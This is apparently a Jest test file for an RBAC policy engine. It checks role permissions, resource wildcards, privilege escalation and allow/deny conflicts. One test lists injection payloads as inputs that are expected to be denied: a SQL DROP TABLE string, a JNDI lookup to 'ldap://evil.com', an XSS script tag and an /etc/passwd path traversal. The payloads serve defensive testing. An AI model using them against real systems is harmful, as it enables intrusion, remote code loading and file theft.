/**
 * Critical Security Tests - RBAC Policy Engine
 * Following Living Spiral Methodology - Security Guardian & Access Control Specialist
 *
 * Test Coverage Areas:
 * - Role-based access control validation
 * - Permission inheritance and delegation
 * - Resource-based authorization
 * - Policy condition evaluation
 * - Privilege escalation prevention
 * - Authorization bypass attempts
 */

import { describe, it, expect, beforeEach, jest } from '@jest/globals';
import { RBACPolicyEngine } from '../../../../src/core/auth/rbac-policy-engine.js';
import {
  Policy,
  PolicyContext,
  Role,
  Permission,
  User,
} from '../../../../src/core/auth/auth-types.js';

describe('RBACPolicyEngine - Critical Security Tests', () => {
  let rbacEngine: RBACPolicyEngine;
  let testUsers: Record<string, User>;
  let testRoles: Record<string, Role>;
  let testPermissions: Record<string, Permission>;

  beforeEach(() => {
    rbacEngine = new RBACPolicyEngine();

    // Define comprehensive test permissions
    testPermissions = {
      readPublic: {
        id: 'read:public',
        name: 'Read Public Resources',
        resource: 'public:*',
        action: 'read',
      },
      readOwn: {
        id: 'read:own',
        name: 'Read Own Resources',
        resource: 'user:*',
        action: 'read',
      },
      writeOwn: {
        id: 'write:own',
        name: 'Write Own Resources',
        resource: 'user:*',
        action: 'write',
      },
      analyzeCode: {
        id: 'analyze:code',
        name: 'Analyze Code',
        resource: 'analysis:*',
        action: 'read',
      },
      generateCode: {
        id: 'generate:code',
        name: 'Generate Code',
        resource: 'generation:*',
        action: 'write',
      },
      manageVoices: {
        id: 'manage:voices',
        name: 'Manage Voice Systems',
        resource: 'voices:*',
        action: '*',
      },
      adminAll: {
        id: 'admin:all',
        name: 'Full Admin Access',
        resource: '*',
        action: '*',
      },
      viewMetrics: {
        id: 'view:metrics',
        name: 'View Metrics',
        resource: 'metrics:*',
        action: 'read',
      },
      manageConfig: {
        id: 'manage:config',
        name: 'Manage Configuration',
        resource: 'config:*',
        action: '*',
      },
    };

    // Define test roles with proper permission hierarchy
    testRoles = {
      guest: {
        id: 'guest',
        name: 'Guest User',
        description: 'Limited read-only access to public resources',
        permissions: [testPermissions.readPublic],
      },
      user: {
        id: 'user',
        name: 'Regular User',
        description: 'Standard user with basic AI features',
        permissions: [
          testPermissions.readPublic,
          testPermissions.readOwn,
          testPermissions.analyzeCode,
          testPermissions.generateCode,
        ],
      },
      developer: {
        id: 'developer',
        name: 'Developer',
        description: 'Advanced user with voice management',
        permissions: [
          testPermissions.readPublic,
          testPermissions.readOwn,
          testPermissions.writeOwn,
          testPermissions.analyzeCode,
          testPermissions.generateCode,
          testPermissions.manageVoices,
          testPermissions.viewMetrics,
        ],
      },
      admin: {
        id: 'admin',
        name: 'Administrator',
        description: 'Full system access',
        permissions: [testPermissions.adminAll],
      },
    };

    // Define test users with different role assignments
    testUsers = {
      guest: {
        id: 'guest-user-123',
        email: 'guest@example.com',
        roles: ['guest'],
        permissions: [],
        isActive: true,
        lastLoginAt: new Date(),
        createdAt: new Date(),
      },
      regularUser: {
        id: 'user-456',
        email: 'user@example.com',
        roles: ['user'],
        permissions: [],
        isActive: true,
        lastLoginAt: new Date(),
        createdAt: new Date(),
      },
      developer: {
        id: 'dev-789',
        email: 'dev@example.com',
        roles: ['developer'],
        permissions: [],
        isActive: true,
        lastLoginAt: new Date(),
        createdAt: new Date(),
      },
      admin: {
        id: 'admin-001',
        email: 'admin@example.com',
        roles: ['admin'],
        permissions: [],
        isActive: true,
        lastLoginAt: new Date(),
        createdAt: new Date(),
      },
      multiRole: {
        id: 'multi-002',
        email: 'multi@example.com',
        roles: ['user', 'developer'], // Multiple roles
        permissions: [],
        isActive: true,
        lastLoginAt: new Date(),
        createdAt: new Date(),
      },
      inactiveUser: {
        id: 'inactive-003',
        email: 'inactive@example.com',
        roles: ['user'],
        permissions: [],
        isActive: false, // Inactive user
        lastLoginAt: new Date(),
        createdAt: new Date(),
      },
    };

    // Add roles to the engine
    Object.values(testRoles).forEach(role => {
      rbacEngine.addRole(role);
    });
  });

  describe('Role-Based Access Control Validation', () => {
    it('should grant access for valid role-permission combinations', async () => {
      const context: PolicyContext = {
        user: testUsers.regularUser,
        resource: 'analysis:project-abc',
        action: 'read',
        timestamp: new Date(),
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
      };

      const result = await rbacEngine.authorize(context);

      expect(result.granted).toBe(true);
      expect(result.reason).toContain('granted');
      expect(result.appliedPolicies).toBeDefined();
    });

    it('should deny access for insufficient permissions', async () => {
      const context: PolicyContext = {
        user: testUsers.guest,
        resource: 'generation:project-xyz',
        action: 'write',
        timestamp: new Date(),
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
      };

      const result = await rbacEngine.authorize(context);

      expect(result.granted).toBe(false);
      expect(result.reason).toContain('insufficient permissions');
      expect(result.deniedBy).toBeDefined();
    });

    it('should handle multiple roles correctly (union of permissions)', async () => {
      const context: PolicyContext = {
        user: testUsers.multiRole,
        resource: 'voices:system-config',
        action: 'write',
        timestamp: new Date(),
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
      };

      const result = await rbacEngine.authorize(context);

      expect(result.granted).toBe(true);
      expect(result.reason).toContain('granted');
    });

    it('should deny access for inactive users regardless of permissions', async () => {
      const context: PolicyContext = {
        user: testUsers.inactiveUser,
        resource: 'analysis:simple-task',
        action: 'read',
        timestamp: new Date(),
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
      };

      const result = await rbacEngine.authorize(context);

      expect(result.granted).toBe(false);
      expect(result.reason).toContain('inactive');
    });
  });

  describe('Resource-Based Authorization', () => {
    it('should enforce resource-specific access controls', async () => {
      const publicContext: PolicyContext = {
        user: testUsers.guest,
        resource: 'public:documentation',
        action: 'read',
        timestamp: new Date(),
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
      };

      const privateContext: PolicyContext = {
        user: testUsers.guest,
        resource: 'private:sensitive-data',
        action: 'read',
        timestamp: new Date(),
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
      };

      const publicResult = await rbacEngine.authorize(publicContext);
      const privateResult = await rbacEngine.authorize(privateContext);

      expect(publicResult.granted).toBe(true);
      expect(privateResult.granted).toBe(false);
    });

    it('should validate wildcard resource patterns correctly', async () => {
      const contexts = [
        {
          user: testUsers.admin,
          resource: 'any:resource:path',
          action: 'read',
        },
        {
          user: testUsers.admin,
          resource: 'system:critical:config',
          action: 'write',
        },
        {
          user: testUsers.admin,
          resource: 'users:all:data',
          action: 'delete',
        },
      ];

      for (const ctx of contexts) {
        const result = await rbacEngine.authorize({
          ...ctx,
          timestamp: new Date(),
          ipAddress: '127.0.0.1',
          userAgent: 'test-agent',
        } as PolicyContext);

        expect(result.granted).toBe(true);
        expect(result.reason).toContain('admin privileges');
      }
    });

    it('should prevent unauthorized resource access patterns', async () => {
      const unauthorizedContexts = [
        {
          user: testUsers.regularUser,
          resource: 'config:system',
          action: 'write', // Regular user cannot modify system config
        },
        {
          user: testUsers.developer,
          resource: 'admin:users',
          action: 'delete', // Developer cannot delete admin resources
        },
        {
          user: testUsers.guest,
          resource: 'metrics:performance',
          action: 'read', // Guest cannot view metrics
        },
      ];

      for (const ctx of unauthorizedContexts) {
        const result = await rbacEngine.authorize({
          ...ctx,
          timestamp: new Date(),
          ipAddress: '127.0.0.1',
          userAgent: 'test-agent',
        } as PolicyContext);

        expect(result.granted).toBe(false);
      }
    });
  });

  describe('Policy Condition Evaluation', () => {
    it('should evaluate time-based access conditions', async () => {
      const timeBasedPolicy: Policy = {
        id: 'business-hours-only',
        name: 'Business Hours Access',
        effect: 'allow',
        subjects: ['user'],
        actions: ['read'],
        resources: ['sensitive:*'],
        conditions: [
          {
            type: 'time',
            operator: 'between',
            values: ['09:00', '17:00'],
          },
        ],
      };

      rbacEngine.addPolicy(timeBasedPolicy);

      // Test during business hours (assuming current time is between 9-17)
      const businessHoursTime = new Date();
      businessHoursTime.setHours(12, 0, 0, 0); // 12:00 PM

      const context: PolicyContext = {
        user: testUsers.regularUser,
        resource: 'sensitive:document',
        action: 'read',
        timestamp: businessHoursTime,
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
      };

      const result = await rbacEngine.authorize(context);

      // Result depends on actual implementation of time conditions
      expect(typeof result.granted).toBe('boolean');
      expect(result.evaluatedConditions).toBeDefined();
    });

    it('should evaluate IP address-based restrictions', async () => {
      const ipBasedPolicy: Policy = {
        id: 'internal-network-only',
        name: 'Internal Network Access',
        effect: 'allow',
        subjects: ['admin'],
        actions: ['*'],
        resources: ['admin:*'],
        conditions: [
          {
            type: 'ip',
            operator: 'in_network',
            values: ['192.168.1.0/24', '10.0.0.0/8'],
          },
        ],
      };

      rbacEngine.addPolicy(ipBasedPolicy);

      const internalContext: PolicyContext = {
        user: testUsers.admin,
        resource: 'admin:critical',
        action: 'write',
        timestamp: new Date(),
        ipAddress: '192.168.1.100',
        userAgent: 'internal-client',
      };

      const externalContext: PolicyContext = {
        user: testUsers.admin,
        resource: 'admin:critical',
        action: 'write',
        timestamp: new Date(),
        ipAddress: '203.0.113.100', // External IP
        userAgent: 'external-client',
      };

      const internalResult = await rbacEngine.authorize(internalContext);
      const externalResult = await rbacEngine.authorize(externalContext);

      // Results depend on actual implementation
      expect(typeof internalResult.granted).toBe('boolean');
      expect(typeof externalResult.granted).toBe('boolean');
    });
  });

  describe('Privilege Escalation Prevention', () => {
    it('should prevent horizontal privilege escalation', async () => {
      const user1Context: PolicyContext = {
        user: testUsers.regularUser,
        resource: `user:${testUsers.developer.id}:profile`, // Trying to access another user's data
        action: 'read',
        timestamp: new Date(),
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
      };

      const result = await rbacEngine.authorize(user1Context);

      expect(result.granted).toBe(false);
      expect(result.reason).toContain('unauthorized access to other user');
    });

    it('should prevent vertical privilege escalation', async () => {
      const escalationContext: PolicyContext = {
        user: testUsers.regularUser,
        resource: 'admin:system-config',
        action: 'write',
        timestamp: new Date(),
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
      };

      const result = await rbacEngine.authorize(escalationContext);

      expect(result.granted).toBe(false);
      expect(result.reason).toContain('insufficient privileges');
    });

    it('should prevent role injection attacks', async () => {
      const maliciousUser: User = {
        id: 'malicious-user',
        email: 'hacker@evil.com',
        roles: ['admin'], // Attempting to claim admin role
        permissions: [],
        isActive: true,
        lastLoginAt: new Date(),
        createdAt: new Date(),
      };

      // User should not be able to self-assign admin role
      const context: PolicyContext = {
        user: maliciousUser,
        resource: 'system:critical',
        action: 'delete',
        timestamp: new Date(),
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
      };

      const result = await rbacEngine.authorize(context);

      // Should fail because the user role isn't properly validated/registered
      expect(result.granted).toBe(false);
    });
  });

  describe('Policy Conflict Resolution', () => {
    it('should handle conflicting allow/deny policies correctly', async () => {
      const allowPolicy: Policy = {
        id: 'allow-read',
        name: 'Allow Read Access',
        effect: 'allow',
        subjects: ['user'],
        actions: ['read'],
        resources: ['documents:*'],
      };

      const denyPolicy: Policy = {
        id: 'deny-sensitive',
        name: 'Deny Sensitive Documents',
        effect: 'deny',
        subjects: ['*'],
        actions: ['*'],
        resources: ['documents:sensitive:*'],
      };

      rbacEngine.addPolicy(allowPolicy);
      rbacEngine.addPolicy(denyPolicy);

      const context: PolicyContext = {
        user: testUsers.regularUser,
        resource: 'documents:sensitive:classified',
        action: 'read',
        timestamp: new Date(),
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
      };

      const result = await rbacEngine.authorize(context);

      // Deny should take precedence over allow
      expect(result.granted).toBe(false);
      expect(result.conflictResolution).toBeDefined();
    });

    it('should prioritize more specific policies over general ones', async () => {
      const generalPolicy: Policy = {
        id: 'general-allow',
        name: 'General Allow',
        effect: 'allow',
        subjects: ['user'],
        actions: ['*'],
        resources: ['files:*'],
      };

      const specificPolicy: Policy = {
        id: 'specific-deny',
        name: 'Specific Deny',
        effect: 'deny',
        subjects: ['user'],
        actions: ['delete'],
        resources: ['files:important:*'],
      };

      rbacEngine.addPolicy(generalPolicy);
      rbacEngine.addPolicy(specificPolicy);

      const context: PolicyContext = {
        user: testUsers.regularUser,
        resource: 'files:important:document.pdf',
        action: 'delete',
        timestamp: new Date(),
        ipAddress: '127.0.0.1',
        userAgent: 'test-agent',
      };

      const result = await rbacEngine.authorize(context);

      // Specific deny should override general allow
      expect(result.granted).toBe(false);
    });
  });

  describe('Performance and Security Stress Tests', () => {
    it('should handle large numbers of concurrent authorization requests', async () => {
      const requests = Array(100)
        .fill(null)
        .map((_, index) => {
          return rbacEngine.authorize({
            user: index % 2 === 0 ? testUsers.regularUser : testUsers.developer,
            resource: `resource:${index}`,
            action: 'read',
            timestamp: new Date(),
            ipAddress: `127.0.0.${Math.floor(index / 254) + 1}`,
            userAgent: `client-${index}`,
          });
        });

      const results = await Promise.allSettled(requests);

      // All requests should complete successfully
      expect(results.every(r => r.status === 'fulfilled')).toBe(true);

      const successfulResults = results
        .filter(r => r.status === 'fulfilled')
        .map(r => (r as any).value);

      expect(successfulResults.every(r => typeof r.granted === 'boolean')).toBe(true);
    });

    it('should prevent policy injection through malicious input', async () => {
      const maliciousInputs = [
        'resource:*; DROP TABLE policies; --',
        'action:read\nresource:admin:*',
        'user[role]=admin',
        '${jndi:ldap://evil.com/x}',
        '<script>alert("xss")</script>',
        '../../../etc/passwd',
      ];

      for (const maliciousInput of maliciousInputs) {
        const context: PolicyContext = {
          user: testUsers.regularUser,
          resource: maliciousInput,
          action: 'read',
          timestamp: new Date(),
          ipAddress: '127.0.0.1',
          userAgent: 'test-agent',
        };

        const result = await rbacEngine.authorize(context);

        // Should not grant access to malicious patterns
        expect(result.granted).toBe(false);
      }
    });

    it('should maintain consistent performance under load', async () => {
      const startTime = process.hrtime.bigint();
      const iterations = 50;

      const promises = Array(iterations)
        .fill(null)
        .map(() => {
          return rbacEngine.authorize({
            user: testUsers.developer,
            resource: 'voices:system',
            action: 'read',
            timestamp: new Date(),
            ipAddress: '127.0.0.1',
            userAgent: 'perf-test',
          });
        });

      await Promise.all(promises);

      const endTime = process.hrtime.bigint();
      const totalTime = Number(endTime - startTime) / 1000000; // Convert to milliseconds
      const avgTime = totalTime / iterations;

      // Each authorization should complete quickly (< 10ms average)
      expect(avgTime).toBeLessThan(10);
    });
  });
});
